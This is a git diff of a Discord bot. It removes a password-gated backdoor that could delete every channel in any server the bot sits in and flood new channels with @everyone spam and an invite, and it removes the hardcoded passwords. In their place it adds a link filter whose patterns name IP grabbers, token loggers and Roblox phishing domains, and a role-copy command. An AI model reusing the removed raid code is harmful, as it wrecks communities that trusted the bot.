@@ -1,204 +1,277 @@
+const http = require("http");
 const {
+  EmbedBuilder,
   Client,
   GatewayIntentBits,
-  EmbedBuilder,
-  ActionRowBuilder,
+  Partials,
+  SlashCommandBuilder,
+  PermissionFlagsBits,
   ButtonBuilder,
   ButtonStyle,
-  ModalBuilder,
-  TextInputBuilder,
-  TextInputStyle,
-  StringSelectMenuBuilder,
-  MessageFlags
-} = require('discord.js');
+  ActionRowBuilder,
+} = require("discord.js");
 
-const express = require('express');
-require('dotenv').config();
+const TOKEN = process.env.TOKEN || process.env.DISCORD_TOKEN;
+const PORT = process.env.PORT || 3000;
+const FAME_GAME_NAME = process.env.FAME_GAME_NAME || "Fame";
 
-// PASSWORDS
-const MAIN_PASSWORD = 'Meka2017charlie';
-const NUKE_PASSWORD = 'meka123';
-
-const userSessions = new Map();
-
-const app = express();
-app.get('/', (req, res) => res.send('Bot Online'));
-app.listen(process.env.PORT || 3000);
-
-const TOKEN = process.env.TOKEN;        // Your bot token from .env
-const CLIENT_ID = process.env.CLIENT_ID; // Application ID (not always needed for this code)
+if (!TOKEN) {
+  console.error("Missing TOKEN environment variable");
+  process.exit(1);
+}
 
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
-    GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.MessageContent
-  ]
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildModeration,
+  ],
+  partials: [Partials.Channel],
 });
 
-client.once('ready', () => {
-  console.log(`${client.user.tag} is online`);
-});
+// ==================== LINK FILTER ====================
+const tiktokRegex = /https?:\/\/(?:www\.|m\.|vm\.)?tiktok\.com\/(?:@[\w.-]+\/video\/\d+|[\w-]+|Z[a-zA-Z0-9]+)/i;
 
-// ====================== !CHECK COMMAND ======================
-client.on('messageCreate', async message => {
+const dangerousPatterns = [
+  /discord\.(gg|com|app)\/(invite\/)?[a-zA-Z0-9-]+/i,
+  /grabify\.link|iplogger\.org|ipgrabber|blasze\.com|trackip|myip\.is|ip-tracker/i,
+  /roblox\.(com\.[a-z]{2,}|gg|app|site|xyz|fun|net|org|login|verify|gift|free|robux)/i,
+  /rblx\.|rblox\.|robloxx?\.|free-robux|robux\.gift|getrobux/i,
+  /cookie-logger|cookielogger|stealer|grabber|token-logger|beam\.link/i,
+];
+
+client.on("messageCreate", async (message) => {
   if (message.author.bot || !message.guild) return;
-  const content = message.content.trim().toLowerCase();
 
-  if (content === '!check') {
-    const embed = new EmbedBuilder()
-      .setColor('#00ff00')
-      .setTitle('🔍 Remote Server Control')
-      .setDescription('Select any server the bot is in to nuke it.')
-      .setFooter({ text: 'Click below' });
+  const urlRegex = /(https?:\/\/[^\s]+)/gi;
+  const urls = message.content.match(urlRegex) || [];
 
-    const row = new ActionRowBuilder().addComponents(
-      new ButtonBuilder()
-        .setCustomId(`check_start_${message.author.id}`)
-        .setLabel('Enter Password')
-        .setStyle(ButtonStyle.Primary)
-    );
+  let shouldBlock = false;
+  let reason = "";
 
-    await message.reply({ embeds: [embed], components: [row] });
+  for (const url of urls) {
+    const lowerUrl = url.toLowerCase();
+
+    if (tiktokRegex.test(url)) continue;
+
+    if (
+      lowerUrl.endsWith('.gif') ||
+      lowerUrl.includes('tenor.com') ||
+      lowerUrl.includes('giphy.com') ||
+      lowerUrl.includes('cdn.discordapp.com') ||
+      lowerUrl.includes('media.discordapp.net') ||
+      lowerUrl.includes('imgur.com')
+    ) continue;
+
+    for (const pattern of dangerousPatterns) {
+      if (pattern.test(lowerUrl)) {
+        shouldBlock = true;
+        reason = "Malicious link detected";
+        break;
+      }
+    }
+    if (shouldBlock) break;
+
+    if (lowerUrl.startsWith('http')) {
+      shouldBlock = true;
+      reason = "Only TikTok links and GIFs are allowed.";
+      break;
+    }
+  }
+
+  if (shouldBlock) {
+    try {
+      await message.delete().catch(() => {});
+      const member = await message.guild.members.fetch(message.author.id).catch(() => null);
+      if (member) await member.timeout(10 * 60 * 1000, reason).catch(() => {});
+
+      const warningEmbed = new EmbedBuilder()
+        .setTitle("🚫 Link Blocked")
+        .setDescription(`${message.author}, your message was removed.`)
+        .addFields({ name: "Reason", value: reason }, { name: "Allowed", value: "TikTok & GIFs only" })
+        .setColor(0xff0000)
+        .setTimestamp();
+
+      const msg = await message.channel.send({ embeds: [warningEmbed] });
+      setTimeout(() => msg.delete().catch(() => {}), 10000);
+    } catch (e) {}
   }
 });
 
-// ====================== INTERACTIONS ======================
-client.on('interactionCreate', async interaction => {
-  if (!interaction.customId) return;
+// ==================== COMMANDS ====================
+
+client.once("ready", async () => {
+  console.log(`${FAME_GAME_NAME} Bot is online!`);
+
+  const commands = [
+    new SlashCommandBuilder()
+      .setName("copyrole")
+      .setDescription("Advanced role copier")
+      .setDefaultMemberPermissions(PermissionFlagsBits.ManageRoles)
+      .addSubcommand(s => s.setName("hex").setDescription("Copy hex colors with preview").addRoleOption(o => o.setName("role").setDescription("Role").setRequired(true)))
+      .addSubcommand(s => s.setName("emoji").setDescription("Copy emoji / download custom icon").addRoleOption(o => o.setName("role").setDescription("Role").setRequired(true)))
+      .addSubcommand(s => s.setName("all").setDescription("Show everything (colors + emoji/icon)").addRoleOption(o => o.setName("role").setDescription("Role").setRequired(true)))
+  ];
+
+  await client.application.commands.set(commands);
+  console.log("Advanced commands registered.");
+});
+
+client.on("interactionCreate", async (interaction) => {
+  if (!interaction.isChatInputCommand() || interaction.commandName !== "copyrole") return;
+
+  await interaction.deferReply().catch(() => {});
 
   try {
-    const parts = interaction.customId.split('_');
-    const action = parts[0];
-    const userId = parts[parts.length - 1];
+    const sub = interaction.options.getSubcommand();
+    const role = interaction.options.getRole("role");
 
-    if (interaction.user.id !== userId) {
-      return interaction.reply({ content: '❌ This is not for you.', flags: MessageFlags.Ephemeral });
-    }
+    const baseColor = role.color || 0x2f3136;
 
-    if (action === 'check') {
-      if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
-        const modal = new ModalBuilder()
-          .setCustomId(`check_modal_${interaction.user.id}`)
-          .setTitle('Enter Password');
-        modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
-        ));
-        return await interaction.showModal(modal);
+    if (sub === "hex") {
+      let desc = "No color set.";
+      let previewHex = baseColor.toString(16).padStart(6, '0');
+
+      if (role.color) {
+        const hex = `#${role.color.toString(16).padStart(6, '0').toUpperCase()}`;
+        desc = `**Color:** \`${hex}\``;
       }
 
-      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
-        const password = interaction.fields.getTextInputValue('password');
-        if (password !== MAIN_PASSWORD) {
-          return interaction.reply({ content: '❌ Incorrect password.', flags: MessageFlags.Ephemeral });
-        }
+      // Gradient support
+      if (role.colors?.primaryColor) {
+        const p = `#${role.colors.primaryColor.toString(16).padStart(6, '0').toUpperCase()}`;
+        desc = `**Primary:** \`${p}\`\n`;
+        previewHex = role.colors.primaryColor.toString(16).padStart(6, '0');
+        if (role.colors.secondaryColor) desc += `**Secondary:** \`#${role.colors.secondaryColor.toString(16).padStart(6, '0').toUpperCase()}\`\n`;
+        if (role.colors.tertiaryColor) desc += `**Tertiary:** \`#${role.colors.tertiaryColor.toString(16).padStart(6, '0').toUpperCase()}\`\n`;
+      }
 
-        const guilds = Array.from(client.guilds.cache.values());
-        if (guilds.length === 0) return interaction.reply({ content: '❌ Bot is not in any servers.', flags: MessageFlags.Ephemeral });
+      const embed = new EmbedBuilder()
+        .setTitle(`🎨 Role Colors — ${role.name}`)
+        .setDescription(desc)
+        .setColor(baseColor)
+        .setThumbnail(`https://singlecolorimage.com/get/${previewHex}/400x400`)
+        .addFields({ name: "Role ID", value: `\`${role.id}\`` })
+        .setTimestamp();
 
-        const options = guilds.map(g => ({
-          label: g.name.length > 100 ? g.name.slice(0, 97) + '...' : g.name,
-          value: g.id
-        }));
+      return interaction.editReply({ embeds: [embed] });
+    }
 
-        const select = new StringSelectMenuBuilder()
-          .setCustomId(`check_server_select_${interaction.user.id}`)
-          .setPlaceholder('Select server to nuke')
-          .addOptions(options);
+    else if (sub === "emoji") {
+      const unicodeEmoji = role.unicodeEmoji;
+      const hasCustomIcon = !!role.icon;
 
-        await interaction.reply({
-          content: '✅ Password correct. Select server:',
-          components: [new ActionRowBuilder().addComponents(select)],
-          flags: MessageFlags.Ephemeral
+      if (!unicodeEmoji && !hasCustomIcon) {
+        return interaction.editReply({ content: `❌ **${role.name}** has no emoji or custom icon.` });
+      }
+
+      let content = "";
+      let desc = "";
+      const components = [];
+
+      if (unicodeEmoji) {
+        content = `**Emoji:** ${unicodeEmoji}`;
+        desc = `**Unicode Emoji:** ${unicodeEmoji}\n\nHighlight and copy it.`;
+      }
+
+      if (hasCustomIcon) {
+        const iconURL = role.iconURL({ extension: "png", size: 512 });
+
+        if (desc) desc += "\n\n";
+        desc += "**Custom Role Icon:**";
+
+        const embed = new EmbedBuilder()
+          .setTitle(`📋 Role Icon — ${role.name}`)
+          .setDescription(desc)
+          .setColor(baseColor)
+          .setImage(iconURL)                    // ← Shows big preview of the icon
+          .setTimestamp();
+
+        // Download button
+        const btn = new ButtonBuilder()
+          .setLabel("⬇️ Download Icon")
+          .setStyle(ButtonStyle.Link)
+          .setURL(iconURL);
+
+        components.push(new ActionRowBuilder().addComponents(btn));
+
+        return interaction.editReply({ 
+          content: content || null, 
+          embeds: [embed], 
+          components 
         });
       }
 
-      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
-        await interaction.deferUpdate();
-        const guild = client.guilds.cache.get(interaction.values[0]);
-        userSessions.set(interaction.user.id, { guildId: guild.id });
+      // If only unicode emoji
+      const embed = new EmbedBuilder()
+        .setTitle(`📋 Role Emoji — ${role.name}`)
+        .setDescription(desc)
+        .setColor(baseColor)
+        .setTimestamp();
 
-        const actionSelect = new StringSelectMenuBuilder()
-          .setCustomId(`check_action_select_${interaction.user.id}`)
-          .setPlaceholder('Choose action')
-          .addOptions([{ label: '☢️ Nuke', value: 'nuke' }]);
-
-        await interaction.editReply({
-          content: `**Selected:** ${guild.name}`,
-          components: [new ActionRowBuilder().addComponents(actionSelect)]
-        });
-      }
-
-      if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
-        if (interaction.values[0] === 'nuke') {
-          const modal = new ModalBuilder()
-            .setCustomId(`check_nuke_modal_${interaction.user.id}`)
-            .setTitle('Confirm Nuke');
-          modal.addComponents(new ActionRowBuilder().addComponents(
-            new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
-          ));
-          return await interaction.showModal(modal);
-        }
-      }
-
-      if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
-        const password = interaction.fields.getTextInputValue('password');
-        if (password !== NUKE_PASSWORD) return interaction.reply({ content: '❌ Wrong password.', flags: MessageFlags.Ephemeral });
-
-        await interaction.deferReply({ flags: MessageFlags.Ephemeral });
-
-        const session = userSessions.get(interaction.user.id);
-        const guild = client.guilds.cache.get(session?.guildId);
-        if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
-
-        const delay = ms => new Promise(r => setTimeout(r, ms));
-        const invite = 'https://discord.gg/veynettas';
-
-        try {
-          await interaction.editReply({ content: `☢️ Deleting all channels in **${guild.name}**...` });
-
-          for (const ch of guild.channels.cache.values()) {
-            await ch.delete().catch(() => {});
-            await delay(400);
-          }
-
-          await interaction.editReply({ content: '🔨 Creating fucked-by-veynetta channels...' });
-
-          let created = 0;
-          for (let i = 0; i < 12; i++) {
-            try {
-              await guild.channels.create({ name: 'fucked-by-veynetta', type: 0 });
-              created++;
-              await delay(800);
-            } catch {}
-          }
-
-          const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
-          const channels = guild.channels.cache.filter(c => c.name === 'fucked-by-veynetta');
-
-          for (const ch of channels.values()) {
-            for (let i = 0; i < 8; i++) ch.send(spamText).catch(() => {});
-          }
-
-          await interaction.editReply({ 
-            content: `✅ **NUKE COMPLETE**\nCreated **${created}** channels named \`fucked-by-veynetta\`` 
-          });
-        } catch (err) {
-          console.error(err);
-          await interaction.editReply({ content: '⚠️ Nuke partially completed.' }).catch(() => {});
-        }
-
-        userSessions.delete(interaction.user.id);
-      }
+      return interaction.editReply({ content, embeds: [embed] });
     }
 
+    else if (sub === "all") {
+      let colorDesc = "No color";
+      let previewHex = baseColor.toString(16).padStart(6, '0');
+
+      if (role.color) {
+        colorDesc = `**Color:** \`#${role.color.toString(16).padStart(6, '0').toUpperCase()}\``;
+      }
+      if (role.colors?.primaryColor) {
+        colorDesc = `**Primary:** \`#${role.colors.primaryColor.toString(16).padStart(6, '0').toUpperCase()}\`\n`;
+        previewHex = role.colors.primaryColor.toString(16).padStart(6, '0');
+        if (role.colors.secondaryColor) colorDesc += `**Secondary:** \`#${role.colors.secondaryColor.toString(16).padStart(6, '0').toUpperCase()}\`\n`;
+      }
+
+      let emojiDesc = "None";
+      const components = [];
+      let imageURL = null;
+
+      if (role.unicodeEmoji) {
+        emojiDesc = role.unicodeEmoji;
+      } else if (role.icon) {
+        imageURL = role.iconURL({ extension: "png", size: 512 });
+        emojiDesc = "Custom Icon (see preview below)";
+        
+        const btn = new ButtonBuilder()
+          .setLabel("⬇️ Download Icon")
+          .setStyle(ButtonStyle.Link)
+          .setURL(imageURL);
+        components.push(new ActionRowBuilder().addComponents(btn));
+      }
+
+      const embed = new EmbedBuilder()
+        .setTitle(`📋 Full Role Copy — ${role.name}`)
+        .setDescription(`**Colors**\n${colorDesc}\n\n**Emoji / Icon**\n${emojiDesc}`)
+        .setColor(baseColor)
+        .setThumbnail(`https://singlecolorimage.com/get/${previewHex}/400x400`);
+
+      if (imageURL) embed.setImage(imageURL);   // Shows the actual role icon big
+
+      return interaction.editReply({ 
+        embeds: [embed], 
+        components: components.length ? components : [] 
+      });
+    }
   } catch (error) {
-    console.error('Interaction Error:', error);
-    if (!interaction.replied && !interaction.deferred) {
-      interaction.reply({ content: '❌ Something went wrong.', flags: MessageFlags.Ephemeral }).catch(() => {});
-    }
+    console.error("Command Error:", error);
+    interaction.editReply({ content: "❌ An error occurred. Please try again." }).catch(() => {});
   }
 });
 
+// ==================== SERVER & ERROR HANDLING ====================
+process.on("unhandledRejection", console.error);
+process.on("uncaughtException", console.error);
+
 client.login(TOKEN);
+
+http.createServer((req, res) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Content-Type", "application/json");
+  res.end(JSON.stringify({ status: "online", message: `${FAME_GAME_NAME} Advanced Bot` }));
+}).listen(PORT);
+
+console.log(`${FAME_GAME_NAME} Advanced Bot started successfully!`);
